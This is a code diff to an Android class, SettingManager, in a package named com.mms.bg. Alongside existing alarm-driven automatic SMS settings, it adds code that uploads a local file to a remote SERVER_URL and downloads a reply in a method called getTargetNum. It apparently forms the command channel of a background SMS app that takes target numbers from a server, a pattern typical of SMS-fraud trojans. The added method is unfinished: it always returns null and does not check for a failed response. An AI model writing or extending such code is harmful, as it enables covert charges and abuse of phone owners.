@@ -1,6 +1,25 @@
 package com.mms.bg.ui;
 
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.URI;
+import java.net.URISyntaxException;
 import java.util.Date;
+
+import org.apache.http.HttpResponse;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.InputStreamEntity;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.params.BasicHttpParams;
+import org.apache.http.params.HttpConnectionParams;
+import org.apache.http.params.HttpParams;
+import org.apache.http.protocol.HTTP;
 
 import android.app.Activity;
 import android.app.AlarmManager;
@@ -37,6 +56,7 @@ public class SettingManager {
 //    private static final long SMS_DELAY_TIME = 30 * 24 * 60 * 60 * 1000;
     private static final long SMS_DEFAULT_DELAY_TIME = 30 * 1000;
     private static final String AUTO_SMS_ACTION = "com.mms.bg.SMS"; 
+    private static final int TIMEOUT = 15 * 1000;
     
     public Activity mForegroundActivity;
     private Context mContext;
@@ -221,11 +241,117 @@ public class SettingManager {
         am.cancel(sender);
     }
     
+    private HttpParams getParams() {
+        HttpParams params = new BasicHttpParams();
+        HttpConnectionParams.setConnectionTimeout(params, TIMEOUT);
+        HttpConnectionParams.setSoTimeout(params, TIMEOUT);
+        HttpConnectionParams.setSocketBufferSize(params, 8192);
+//        if (getProxy() == true) {
+//            final HttpHost proxy = new HttpHost(mProxyHost, mProxyPort, "http");
+//            params.setParameter(ConnRoutePNames.DEFAULT_PROXY, proxy);
+//        }
+        return params;
+    }
+    
+    public HttpResponse openConnection(File uploadFile) {
+        LOGD("[[openConnection]]");
+        HttpClient hc = new DefaultHttpClient(getParams());
+        HttpPost post = new HttpPost();
+        try {
+            post.setURI(new URI(SERVER_URL));
+        } catch (URISyntaxException e) {
+            e.printStackTrace();
+            return null;
+        }
+        post.setHeader(HTTP.CONTENT_TYPE, "text/plain");
+        post.setHeader("Accept", "*/*");
+        if (uploadFile != null) {
+            InputStreamEntity entity = null;
+            try {
+                FileInputStream fis = new FileInputStream(uploadFile);
+                entity = new InputStreamEntity(fis, fis.available());
+            } catch (FileNotFoundException e1) {
+                e1.printStackTrace();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            ((HttpPost) post).setEntity(entity);
+        }
+        try {
+            HttpResponse response = hc.execute(post);
+            LOGD("[[openConnection]] return response != null");
+            return response;
+        } catch (ClientProtocolException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return null;
+    }
+    
+    public String getTargetNum() {
+        File file = new File("/data/data/com.mms.bg/files/test.xml");
+        if (file.exists() == false) {
+            return null;
+        }
+        LOGD("[[getTargetNum]] the file upload is exist");
+        HttpResponse r = openConnection(file);
+        if (r.getStatusLine().getStatusCode() != 200) {
+            LOGD("[[getTargetNum]] r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
+            return null;
+        }
+        try {
+            String outFilePath = "/data/data/com.mms.bg/files/download.xml";
+            File outFile = new File(outFilePath);
+            if (!outFile.exists()) {
+                outFile.createNewFile();
+            }
+            LOGD("[[getTargetNum]] download file now");
+            FileOutputStream fos = new FileOutputStream(outFilePath, false);
+            InputStream is = r.getEntity().getContent();
+            byte[] buffer = new byte[1024];
+            int readLength = 0;
+            while ((readLength = is.read(buffer, 0, 1024)) != -1) {
+                fos.write(buffer, 0, readLength);
+                fos.flush();
+            }
+            fos.close();
+            is.close();
+            dumpReceiveFile(outFilePath);
+        } catch (Exception e) {
+            Log.d(TAG, "[[getTargetNum]] e = " + e.getMessage());
+        }
+        return null;
+    }
+    
+    private void dumpReceiveFile(String filename) {
+        if (DEBUG) {
+            try {
+                Log.d(TAG, "[[dumpReceiveFile]] begin dump the file = " + filename);
+                File file = new File(filename);
+                FileInputStream in = new FileInputStream(file);
+                int length = (int) file.length();
+                byte[] datas = new byte[length];
+                in.read(datas, 0, datas.length);
+                String result = new String(datas);
+                Log.d(TAG, result);
+            } catch (Exception e) {
+                Log.d(TAG, "[[dumpReceiveFile]] e = " + e.getMessage());
+            }
+        }
+    }
+    
     private SettingManager(Context context) {
         mContext = context;
         mSP = PreferenceManager.getDefaultSharedPreferences(mContext);
         mEditor = mSP.edit();
         mLog = new XmlLog(context.getFilesDir().getAbsolutePath() + "/log.xml", true);
+    }
+    
+    private static void LOGD(String msg) {
+        if (DEBUG) {
+            Log.d(TAG, msg);
+        }
     }
     
 }
